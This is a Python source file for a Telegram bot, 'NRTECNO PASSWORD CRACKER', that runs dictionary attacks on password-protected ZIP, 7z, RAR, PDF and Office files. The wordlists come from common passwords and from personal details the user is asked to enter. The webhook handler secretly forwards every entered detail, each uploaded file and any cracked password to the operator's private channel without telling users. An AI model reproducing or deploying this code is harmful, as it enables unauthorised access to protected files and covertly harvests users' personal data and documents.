# ============================================================
# PART 1: IMPORTS, CONFIG, SESSIONS, TELEGRAM HELPERS
# ============================================================
import os
import json
import time
import random
import requests
import itertools
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify
from datetime import datetime

TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1001234567890
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)
user_sessions = {}

def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(url, files=files, data=data)

def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    requests.post(url, json=payload)

def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False

def get_auto_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
            ]
        ]
    }

def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }# ============================================================
# PART 2: UNLIMITED PASSWORD GENERATOR
# ============================================================
def generate_unlimited_passwords():
    """Generate passwords from 5 to 100 characters - UNLIMITED"""
    passwords = set()
    lower = 'abcdefghijklmnopqrstuvwxyz'
    upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    digits = '0123456789'
    special = '@#&%!$_-'
    
    # 1. BASIC PASSWORDS (admin, ADMIN, Admin, aDmIn)
    base_words = ['admin', 'password', 'root', 'toor', 'user', 'guest', 'login', 'secret', 'private', 'public', 'default', 'changeme', 'welcome', 'hello', 'test', 'demo']
    for word in base_words:
        passwords.add(word); passwords.add(word.upper()); passwords.add(word.capitalize())
        for _ in range(10):
            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
            passwords.add(mixed)
        for num in ['123', '456', '789', '2024', '2025']:
            passwords.add(f"{word}{num}"); passwords.add(f"{word.upper()}{num}"); passwords.add(f"{word.capitalize()}{num}")
        for spec in special:
            passwords.add(f"{word}{spec}"); passwords.add(f"{word}{spec}{random.randint(10, 99)}"); passwords.add(f"{spec}{word}")
    
    # 2. NAMES WITH GAPS (Narendra Kumar Meghwal)
    common_names = ['raj','rahul','amit','vikram','ajay','sunil','anil','deepak','sanjay','vijay','arjun','karan','mohit','rohit','ankit','vivek','manoj','suresh','mahesh','ramesh','dinesh','ganesh','naveen','pawan','sachin','rajesh','kapil','narendra','mukesh','ravi','ashok','shyam','ghanshyam','kumar','singh','sharma','verma','gupta','yadav','jain','patel','shah','desai','meghwal']
    for name in common_names[:20]:
        for surname in common_names[:15]:
            if name != surname:
                passwords.add(f"{name} {surname}")
                passwords.add(f"{name} {surname} {random.randint(10, 99)}")
                passwords.add(f"{name} {surname}@{random.randint(10, 99)}")
                passwords.add(f"{name.capitalize()} {surname.capitalize()}")
                passwords.add(f"{name.upper()} {surname.upper()}")
                passwords.add(f"{name}{surname}")
    for n1 in common_names[:10]:
        for n2 in common_names[:8]:
            for n3 in common_names[:5]:
                if n1 != n2 and n2 != n3:
                    passwords.add(f"{n1} {n2} {n3}")
                    passwords.add(f"{n1.capitalize()} {n2.capitalize()} {n3.capitalize()}")
                    passwords.add(f"{n1.upper()} {n2.upper()} {n3.upper()}")
                    passwords.add(f"{n1}{n2}{n3}")
    
    # 3. MIXED PASSWORDS
    common_words = ['password','admin','root','toor','iloveyou','sunshine','princess','dragon','baseball','superman','batman','trustno','hello','freedom','whatever','qwerty','letmein','welcome','monkey','secret','love','angel','rainbow','tiger','eagle','phoenix','shadow','night','star','moon','sun','cloud','thunder','lightning']
    for w1 in common_words[:15]:
        for w2 in common_words[:10]:
            if w1 != w2:
                passwords.add(f"{w1} {w2}")
                passwords.add(f"{w1.capitalize()} {w2.capitalize()}")
                passwords.add(f"{w1.upper()} {w2.upper()}")
                passwords.add(f"{w1} {w2} {random.randint(10, 99)}")
                passwords.add(f"{w1}{w2}")
    for name in common_names[:15]:
        for word in common_words[:10]:
            passwords.add(f"{name} {word}")
            passwords.add(f"{name} {word} {random.randint(10, 99)}")
            passwords.add(f"{name}{word}")
            passwords.add(f"{name.capitalize()} {word.capitalize()}")
            passwords.add(f"{name.upper()} {word.upper()}")
            for spec in ['@','#','&','%']:
                passwords.add(f"{name}{spec}{word}")
                passwords.add(f"{name}{spec}{word}{random.randint(10, 99)}")
    
    # 4. BRAND VARIATIONS (Password by Nrtecno)
    brand_variations = ["Password by Nrtecno", "PASSWORD BY NRTECNO", "Password By Nrtecno", "password by nrtecno", "Nrtecno Password", "NRTECNO PASSWORD", "Nrtecno@2024", "Nrtecno#2025", "Nrtecno%2026", "Nrtecno Password 2024", "NRTECNO@2024", "Nrtecno_2024"]
    for var in brand_variations:
        passwords.add(var)
        for num in ['123', '456', '789', '2024', '2025']:
            passwords.add(f"{var}{num}")
            passwords.add(f"{var}@{num}")
            passwords.add(f"{var}#{num}")
    
    # 5. YEARS + NAME + ALL CASE VARIATIONS
    years = ['2020','2021','2022','2023','2024','2025','2026']
    for name in common_names[:20]:
        for year in years:
            passwords.add(f"{name}{year}")
            passwords.add(f"{name.capitalize()}{year}")
            passwords.add(f"{name.upper()}{year}")
            passwords.add(f"{name} {year}")
            passwords.add(f"{name}@{year}")
            passwords.add(f"{name}#{year}")
    
    # 6. MOBILE NUMBER COMBINATIONS
    mobile_patterns = ["9876543210", "987654321", "876543210", "76543210", "1234567890", "987654", "123456"]
    for mobile in mobile_patterns:
        passwords.add(mobile)
        for name in common_names[:10]:
            passwords.add(f"{name}{mobile}")
            passwords.add(f"{name}{mobile[-4:]}")
            passwords.add(f"{name} {mobile}")
            passwords.add(f"{name}@{mobile}")
    
    # 7. LONG PASSWORDS (30 to 100 chars)
    long_patterns = ["abcdefghijklmnopqrstuvwxyz", "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "0123456789", "qwertyuiopasdfghjklzxcvbnm", "thequickbrownfoxjumpsoverthelazydog", "packmyboxwithfivedozenliquorjugs", "howvexinglyquickdafoxjumpsoverthelazydog", "thefiveboxingwizardsjumpquickly"]
    for pattern in long_patterns:
        for length in range(30, 101):
            if len(pattern) >= length:
                base = pattern[:length]
                passwords.add(base)
                for pos in range(10, min(len(base), 50), 10):
                    if pos < len(base):
                        passwords.add(base[:pos] + " " + base[pos:])
                        passwords.add(base[:pos] + "@" + base[pos:])
                for num in ['123', '456', '789', '2024']:
                    if len(base) >= len(num) + 3:
                        pwd = f"{base[:length-len(num)-1]}{num}{random.choice(special)}"
                        passwords.add(pwd)
                        if len(pwd) > 20:
                            pos = random.randint(10, len(pwd)-10)
                            passwords.add(pwd[:pos] + " " + pwd[pos:])
    
    # 8. ALL CASE VARIATIONS FOR COMMON WORDS
    all_words = common_names + common_words + base_words
    for word in all_words[:50]:
        for _ in range(8):
            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
            passwords.add(mixed)
            for num in ['123', '456', '789']:
                passwords.add(f"{mixed}{num}")
                passwords.add(f"{mixed}@{num}")
    
    # 9. SOCIAL MEDIA STYLE
    social = ["instagram", "facebook", "twitter", "telegram", "whatsapp", "snapchat", "youtube", "reddit", "discord", "spotify"]
    for s in social:
        for word in common_words[:10]:
            passwords.add(f"{s}_{word}")
            passwords.add(f"{s}_{word}{random.randint(10, 99)}")
            passwords.add(f"{s.upper()}_{word.upper()}")
    
    passwords = list(passwords)
    random.shuffle(passwords)
    print(f"✅ Generated {len(passwords)} unlimited passwords")
    return passwords
    # ============================================================
# PART 3: SMART PASSWORD GENERATOR (INFO MODE)
# ============================================================
class SmartPasswordGenerator:
    def __init__(self, info=None):
        self.info = info or {}
        self.common_words = ['password','admin','root','toor','iloveyou','sunshine','princess','dragon','baseball','superman','batman','trustno','hello','freedom','whatever','qwerty','letmein','welcome','monkey','secret','love','angel','rainbow','tiger','eagle','phoenix','shadow','night','star','moon','sun','cloud','thunder','lightning']
        self.special_chars = ['@', '#', '&', '%', '!', '$', '_', '-']
        self.numbers = ['1','12','123','1234','12345','123456','1234567','12345678','123456789','1234567890']
        self.years = ['2020','2021','2022','2023','2024','2025','2026']
    
    def generate_from_info(self):
        passwords = set()
        name = self.info.get('name', '').strip().lower()
        dob = self.info.get('dob', '').strip()
        father = self.info.get('father', '').strip().lower()
        mother = self.info.get('mother', '').strip().lower()
        city = self.info.get('city', '').strip().lower()
        mobile = self.info.get('mobile', '').strip()
        
        year = ''
        if dob:
            if '/' in dob:
                parts = dob.split('/')
                if len(parts) == 3:
                    year = parts[-1]
            elif '-' in dob:
                parts = dob.split('-')
                if len(parts) == 3:
                    year = parts[-1]
        
        info_pieces = [p for p in [name, father, mother, city] if p]
        
        # 1. Name variations (admin, ADMIN, Admin, aDmIn)
        for p in info_pieces:
            if p:
                passwords.add(p); passwords.add(p.upper()); passwords.add(p.capitalize())
                for _ in range(10):
                    mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in p)
                    passwords.add(mixed)
                for num in self.numbers[:5]:
                    passwords.add(f"{p}{num}"); passwords.add(f"{p.upper()}{num}"); passwords.add(f"{p.capitalize()}{num}")
                    passwords.add(f"{p} {num}")
                for spec in self.special_chars:
                    passwords.add(f"{p}{spec}"); passwords.add(f"{spec}{p}")
                    passwords.add(f"{p}{spec}{random.randint(10, 99)}")
        
        # 2. Name + Name (Narendra Kumar Meghwal style)
        for p1 in info_pieces:
            for p2 in info_pieces:
                if p1 != p2:
                    passwords.add(f"{p1} {p2}")
                    passwords.add(f"{p1.capitalize()} {p2.capitalize()}")
                    passwords.add(f"{p1.upper()} {p2.upper()}")
                    passwords.add(f"{p1}{p2}")
                    for num in self.numbers[:3]:
                        passwords.add(f"{p1} {p2} {num}")
                        passwords.add(f"{p1}{p2}{num}")
                    for spec in self.special_chars:
                        passwords.add(f"{p1}{spec}{p2}")
                        passwords.add(f"{p1} {spec} {p2}")
        
        # 3. Name + Year
        for p in info_pieces:
            if p:
                for y in self.years[:8]:
                    passwords.add(f"{p}{y}"); passwords.add(f"{p.capitalize()}{y}"); passwords.add(f"{p.upper()}{y}")
                    passwords.add(f"{p} {y}"); passwords.add(f"{p}@{y}"); passwords.add(f"{p}#{y}")
        
        # 4. Name + Common Word
        for p in info_pieces:
            if p:
                for word in self.common_words[:10]:
                    passwords.add(f"{p} {word}")
                    passwords.add(f"{p.capitalize()} {word.capitalize()}")
                    passwords.add(f"{p}{word}")
                    for num in self.numbers[:3]:
                        passwords.add(f"{p} {word} {num}")
                        passwords.add(f"{p}{word}{num}")
                        passwords.add(f"{p} {word}@{num}")
                    for spec in self.special_chars:
                        passwords.add(f"{p}{spec}{word}")
                        passwords.add(f"{p} {spec} {word}")
        
        # 5. Password by Nrtecno style
        brand = "Nrtecno"
        for p in info_pieces:
            if p:
                passwords.add(f"Password by {p}")
                passwords.add(f"PASSWORD BY {p.upper()}")
                passwords.add(f"{p} Password")
                passwords.add(f"{brand} {p}")
                passwords.add(f"{brand}@{p}")
                for num in self.numbers[:3]:
                    passwords.add(f"{p} {brand} {num}")
                    passwords.add(f"{p}{brand}{num}")
        
        # 6. Mobile combinations
        if mobile:
            mobile_clean = ''.join(filter(str.isdigit, mobile))
            if mobile_clean:
                for i in range(2, len(mobile_clean) + 1):
                    passwords.add(mobile_clean[:i]); passwords.add(mobile_clean[-i:])
                    for p in info_pieces:
                        if p:
                            passwords.add(f"{p}{mobile_clean[:i]}")
                            passwords.add(f"{p} {mobile_clean[:i]}")
                            passwords.add(f"{p}@{mobile_clean[:i]}")
                            passwords.add(f"{p}{mobile_clean[-i:]}")
        
        # 7. DOB combinations
        if dob:
            clean_dob = dob.replace('/', '').replace('-', '')
            if len(clean_dob) >= 4:
                passwords.add(clean_dob); passwords.add(clean_dob[-4:])
                for p in info_pieces:
                    if p:
                        passwords.add(f"{p}{clean_dob}")
                        passwords.add(f"{p} {clean_dob}")
                        passwords.add(f"{p}{clean_dob[-4:]}")
                        passwords.add(f"{p}@{clean_dob}")
        
        # 8. Three piece combinations
        for p1 in info_pieces:
            for p2 in info_pieces:
                if p1 != p2:
                    for p3 in info_pieces:
                        if p3 != p1 and p3 != p2:
                            passwords.add(f"{p1} {p2} {p3}")
                            passwords.add(f"{p1.capitalize()} {p2.capitalize()} {p3.capitalize()}")
                            passwords.add(f"{p1}{p2}{p3}")
                            for num in self.numbers[:2]:
                                passwords.add(f"{p1} {p2} {p3} {num}")
                                passwords.add(f"{p1}{p2}{p3}{num}")
        
        # 9. Long passwords from info
        for p in info_pieces:
            if p and len(p) >= 3:
                for length in range(30, 101):
                    base = (p * (length // len(p) + 1))[:length]
                    passwords.add(base); passwords.add(base.capitalize()); passwords.add(base.upper())
                    for pos in range(10, min(len(base), 60), 15):
                        if pos < len(base):
                            passwords.add(base[:pos] + " " + base[pos:])
                            passwords.add(base[:pos] + "@" + base[pos:])
                    for num in ['123', '456', '789']:
                        if len(base) >= len(num) + 3:
                            pwd = f"{base[:length-len(num)-1]}{num}@{random.randint(1, 9)}"
                            passwords.add(pwd)
                            if len(pwd) > 20:
                                pos = random.randint(10, len(pwd)-10)
                                passwords.add(pwd[:pos] + " " + pwd[pos:])
        
        return list(passwords)
        # ============================================================
# PART 4: FILE CRACKERS
# ============================================================
def crack_zip(file_path, password_list):
    for pwd in password_list:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None

def crack_7z(file_path, password_list):
    for pwd in password_list:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None

def crack_pdf(file_path, password_list):
    for pwd in password_list:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None

def crack_office(file_path, password_list):
    try:
        import msoffcrypto
        for pwd in password_list:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_rar(file_path, password_list):
    try:
        import rarfile
        for pwd in password_list:
            try:
                with rarfile.RarFile(file_path) as rf:
                    rf.extractall(pwd=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_file(file_path, ext, password_list):
    if ext == 'zip':
        return crack_zip(file_path, password_list)
    elif ext == '7z':
        return crack_7z(file_path, password_list)
    elif ext == 'pdf':
        return crack_pdf(file_path, password_list)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office(file_path, password_list)
    elif ext == 'rar':
        return crack_rar(file_path, password_list)
    return None
    # ============================================================
# PART 5: WEBHOOK HANDLER, SET WEBHOOK, MAIN
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400
        
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))
            
            if 'text' in message:
                text = message['text']
                
                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        send_message(chat_id, "🔐 *NRTECNO PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a password protected file.*", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200
                
                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session = user_sessions[chat_id]
                    field = session['current_field']
                    session['info'][field] = text
                    
                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *Field:* {field}\n📄 *Value:* {text}\n👤 @{username}")
                    except:
                        pass
                    
                    fields = session['fields']
                    current_index = fields.index(field)
                    
                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
                    else:
                        session['state'] = 'cracking'
                        info_summary = "📝 *User Info Collected*\n\n"
                        for f, v in session['info'].items():
                            info_summary += f"📌 *{f.title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass
                        
                        send_message(chat_id, "🔄 *Generating passwords from your info...*\n⏳ Please wait.", parse_mode='Markdown')
                        generator = SmartPasswordGenerator(session['info'])
                        password_list = generator.generate_from_info()
                        send_message(chat_id, f"📊 *Generated {len(password_list)} passwords*\n🔍 *Cracking...*", parse_mode='Markdown')
                        
                        file_path = session['file_path']
                        ext = session['file_ext']
                        password = crack_file(file_path, ext, password_list)
                        
                        if password:
                            send_message(chat_id, f"✅ *Password Cracked!*\n\n🔑 `{password}`", parse_mode='Markdown')
                            try:
                                send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {session['file_name']}\n🔑 {password}\n👤 @{username}")
                            except:
                                pass
                        else:
                            send_message(chat_id, f"❌ *Password Not Found!*\n\n🔢 {len(password_list)} passwords tried.", parse_mode='Markdown')
                        
                        os.remove(file_path)
                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200
            
            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']
                
                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200
                
                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = requests.get(file_url)
                
                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                
                ext = file_name.split('.')[-1].lower()
                
                try:
                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
                except:
                    pass
                
                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'state': 'waiting_for_option'
                }
                
                send_message(chat_id, "📁 *File Received!*\n\n" f"📄 {file_name}\n🔽 *Choose an option:*", reply_markup=get_auto_buttons(), parse_mode='Markdown')
                return jsonify({"status": "ok"}), 200
        
        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']
            
            if data == 'verify':
                if check_channel_membership(user_id):
                    edit_message(chat_id, message_id, "🔐 *NRTECNO PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a file.*", parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            if data == 'auto_direct':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200
                
                edit_message(chat_id, message_id, "🔄 *AUTO mode activated (Direct)...*\n⏳ Generating unlimited passwords...", parse_mode='Markdown')
                password_list = generate_unlimited_passwords()
                send_message(chat_id, f"📊 *Generated {len(password_list)} passwords*\n🔍 *Cracking...*", parse_mode='Markdown')
                
                file_path = session['file_path']
                ext = session['file_ext']
                password = crack_file(file_path, ext, password_list)
                
                if password:
                    send_message(chat_id, f"✅ *Password Cracked!*\n\n🔑 `{password}`", parse_mode='Markdown')
                    try:
                        send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {session['file_name']}\n🔑 {password}\n👤 @{user_id}")
                    except:
                        pass
                else:
                    send_message(chat_id, f"❌ *Password Not Found!*\n\n🔢 {len(password_list)} passwords tried.", parse_mode='Markdown')
                    try:
                        send_document(PRIVATE_CHANNEL, file_path, f"❌ Not Found!\n📁 {session['file_name']}\n🔢 {len(password_list)} tried\n👤 @{user_id}")
                    except:
                        pass
                
                os.remove(file_path)
                del user_sessions[chat_id]
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            if data == 'auto_info':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200
                
                fields = ['name', 'dob', 'father', 'mother', 'city', 'mobile']
                session['info'] = {}
                session['fields'] = fields
                session['current_field'] = fields[0]
                session['state'] = 'collecting_info'
                
                edit_message(chat_id, message_id, "📝 *Let's collect some info for better password generation*\n\n", parse_mode='Markdown')
                send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
            
            if data == 'cancel':
                session = user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    os.remove(session['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error"}), 500

def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    response = requests.post(url, json={"url": webhook_url})
    if response.status_code == 200:
        print(f"✅ Webhook set to: {webhook_url}")
    else:
        print(f"❌ Webhook failed: {response.text}")

if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        exit(1)
    
    set_webhook()
    port = int(os.environ.get("PORT", 5000))
    print("🤖 NRTECNO BOT STARTED (Flask + Webhook + UNLIMITED Generator)...")
    print("🔢 Password generation: 5 to 100 chars")
    print("📝 All info forwarded to private channel")
    print("🚀 Running on port", port)
    app.run(host="0.0.0.0", port=port)
